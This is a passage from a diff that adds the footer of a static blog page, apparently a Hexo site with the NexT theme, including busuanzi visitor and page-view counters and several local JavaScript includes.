+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
